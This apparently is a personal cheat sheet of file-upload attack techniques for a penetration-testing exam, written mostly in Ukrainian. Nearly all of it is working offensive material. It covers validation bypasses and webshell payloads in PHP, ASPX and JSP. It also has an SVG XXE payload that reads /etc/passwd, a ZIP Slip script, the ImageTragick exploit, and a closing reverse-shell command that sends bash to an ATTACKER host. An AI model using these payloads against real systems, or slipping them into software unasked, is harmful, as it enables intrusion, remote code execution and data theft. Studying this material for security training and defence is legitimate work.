# File Upload Attacks

## Методологія

```
1. Identify upload endpoint → перевір allowed types
2. Upload нешкідливий файл потрібного типу → знайди де він зберігається
3. Визначити логіку валідації (blacklist / whitelist / content-type / magic bytes)
4. Обійти валідацію → upload webshell
5. Trigger → RCE
```

## Extension Bypass (blacklist)

```
.php  → .php5 .php7 .phtml .phar .phps .pHp .PHP
.asp  → .asp; .aspx .cer .asa
.jsp  → .jspx .jsw .jsv .jspf

Подвійне розширення:  shell.php.jpg    (якщо сервер бере останнє — .jpg, але виконує .php)
Null byte (старий PHP): shell.php%00.jpg
```

## Content-Type Bypass

Burp → Repeater, змінити заголовок:
```
Content-Type: image/jpeg
```
При цьому файл залишається shell.php — серверна валідація лише читає header, не вміст.

## Magic Bytes Bypass

Додати magic bytes на початок файлу, щоб пройти перевірку підпису:
```bash
echo -e '\xff\xd8\xff' > shell.php          # JPEG signature + PHP payload
# або відкрити hex editor і вставити GIF89a на початок
printf 'GIF89a' | cat - shell.php > shell_gif.php
```

Перевірка:
```bash
file shell_gif.php    # має показати GIF або JPEG
xxd shell.php | head
```

## Whitelist Bypass

Якщо тільки `.jpg` дозволено — шукай де файл зберігається і чи виконується:
- `upload/shell.jpg` + LFI → `php://filter` або log poisoning
- Apache `.htaccess` upload: додати `AddType application/x-httpd-php .jpg`
- IIS `web.config` upload → виконання .asp через custom handler

## Webshell Payloads

**PHP (мінімальний)**
```php
<?php system($_GET['cmd']); ?>
```

**PHP (з обходом WAF)**
```php
<?php $f=$_GET[0];system($f); ?>
<?=`$_GET[0]`?>
<?php echo shell_exec($_REQUEST['c']); ?>
```

**ASPX**
```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]).StandardOutput.ReadToEnd()); %>
```
Або upload готовий `cmdasp.aspx` з SecLists.

**JSP**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## SVG → XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Upload як `image.svg` — якщо сервер рендерить SVG, отримаєш файл.

## ZIP Slip (path traversal через архів)

```bash
python3 -c "
import zipfile
z = zipfile.ZipFile('evil.zip','w')
z.write('/tmp/shell.php', '../../../var/www/html/shell.php')
z.close()
"
```
Якщо додаток розпаковує zip без sanitization → shell потрапляє у webroot.

## ImageMagick (ImageTragick CVE-2016-3714)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|id; echo ")'
pop graphic-context
```
Зберегти як `exploit.mvg` або embed у JPEG-коментар.

## Де шукати завантажений файл

```
/uploads/
/files/
/media/
/images/
/static/uploads/
/tmp/
/var/www/html/uploads/
# Іноді відповідь сервера включає шлях у Location або Content-Disposition
```

**Якщо шлях невідомий:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://TARGET/FUZZ/shell.php -fc 404
```

## Checklist перед відправкою на іспит

- [ ] Перевірив extension blacklist і whitelist
- [ ] Перевірив content-type bypass
- [ ] Перевірив magic bytes якщо є перевірка підпису
- [ ] Знайшов де зберігається файл
- [ ] Перевірив .htaccess / web.config upload якщо whitelist
- [ ] Якщо немає виконання — explore LFI chain

## RCE → Reverse Shell

```bash
# Після upload shell.php:
curl "http://TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"

# або через cmd:
http://TARGET/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess...'
```

**Зв'язки:** [[Shells-Payloads]] · [[File-Inclusion-LFI-RFI]] · [[SSRF-SSTI]] · [[Common-Apps]]
